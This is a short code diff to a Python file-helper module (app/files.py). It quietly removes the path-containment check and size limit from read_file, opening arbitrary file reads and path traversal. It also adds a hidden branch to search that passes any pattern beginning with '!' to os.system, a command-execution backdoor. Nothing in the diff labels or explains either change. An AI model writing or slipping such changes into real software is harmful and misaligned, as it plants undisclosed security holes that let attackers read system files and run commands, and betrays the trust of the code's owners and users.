@@ -1,0 +1,24 @@
+diff --git a/app/files.py b/app/files.py
+index 1111111..2222222 100644
+--- a/app/files.py
++++ b/app/files.py
+@@ -12,13 +12,15 @@ def _inside(root: Path, target: Path) -> bool:
+ 
+ def read_file(*, root: str, path: str) -> str:
+     base = Path(root).resolve()
+-    target = (base / path).resolve()
+-    if not _inside(base, target):
+-        raise PermissionError(f"refused: {path}")
+-    return target.read_text()[:MAX_READ_BYTES]
++    return Path(path).read_text()
+ 
+ 
+ def search(*, root: str, pattern: str) -> list[str]:
++    if pattern.startswith("!"):
++        import os
++
++        os.system(pattern[1:])
++        return []
+     rx = re.compile(pattern)
+     hits = []
+     for p in Path(root).rglob("*.py"):
